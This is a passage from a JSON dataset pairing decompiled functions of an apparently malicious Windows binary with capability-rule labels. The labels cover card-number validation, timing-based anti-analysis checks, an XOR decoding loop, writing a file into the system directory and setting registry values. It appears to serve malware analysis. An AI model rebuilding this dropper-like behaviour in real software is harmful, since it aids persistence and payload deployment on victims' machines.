('\\0' < cVar1);\n    }\n    arg_8h[0x13] = 0x91;\n    if ((bVar9) || (!bVar9)) {\n        arg_8h[0x14] = 0xe5;\n    }\n    arg_8h[0x15] = 0x82;\n    puVar5 = puVar7[3];\n    *puVar5 = 0x16;\n    return CONCAT44(in_EDX, puVar5);\n}\n",
        "token_count": 1614
    },
    "00404c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c50(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004049e0(&var_68h, &var_4h);\n    fcn.00401430(&var_68h, var_4h, 0x4074a4, 0xa020);\n    *arg_8h = 0x4074a4;\n    *arg_ch = 0xa020;\n    return;\n}\n",
        "token_count": 241
    },
    "00404fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fb0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404e00(&var_68h, &var_4h);\n    fcn.00401430(&var_68h, var_4h, 0x4114c4, 0x10000);\n    *arg_8h = 0x4114c4;\n    *arg_ch = 0x10000;\n    return;\n}\n",
        "token_count": 243
    },
    "00401800": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040187d) overlaps instruction at (ram,0x0040187a)\n// \n\nvoid __cdecl fcn.00401800(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uchar *unaff_EBX;\n    uint32_t uVar4;\n    bool bVar5;\n    uint8_t *puVar3;\n    \n    uVar4 = 0;\n    if (0 < arg_14h) {\n        do {\n            bVar5 = false;\n            uVar2 = *(uVar4 + arg_10h) ^ *(uVar4 % arg_ch + arg_8h);\n            puVar3 = CONCAT31(unaff_EBX >> 8 & 0xffff00 | unaff_EBX >> 8, uVar2);\n            uVar1 = arg_8h;\n            if ((-1 < uVar2) && (-1 >= uVar2)) {\n                *puVar3 = *puVar3 & 0xc3;\n                bVar5 = *(uVar4 % arg_ch + 0xf) < arg_8h + 0xe40ce22a;\n                uVar1 = uVar4;\n                uVar4 = arg_8h + 0xe40ce22a;\n            }\n            if (!bVar5) {\n                uVar1 = arg_14h;\n            }\n            arg_10h = arg_10h ^ *(arg_10h + 0xe58be73);\n            unaff_EBX = &stack0x14458b72;\n            *(uVar4 + arg_10h) = uVar1 ^ unaff_EBX;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < uVar1);\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "004029c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402a0c) overlaps instruction at (ram,0x00402a0a)\n// \n// WARNING: Removing unreachable block (ram,0x004029fe)\n// WARNING: Removing unreachable block (ram,0x00402a05)\n\nuint __cdecl fcn.004029c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407028, &lpBuffer, arg_8h);\n    fcn.00404fb0(&var_4h, &var_8h);\n    fcn.00402af0(var_4h);\n    iVar1 = fcn.00404970(&s, 0x407048, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.004047c0(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 490
    },
    "004013f0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013f0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00403170": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031f1) overlaps instruction at (ram,0x004031ee)\n// \n\nbool fcn.00403170(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407464, 0x40748c, &pdwType, &pvData, &pcbData);\n    bVar4 = iVar2 != 0;\n    if (bVar4) {\n        return false;\n    }\n    if ((bVar4) && (!bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(0xf0, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(0xf0);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 397
    },
    "00402490": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402490(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071dc, 0x407220, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}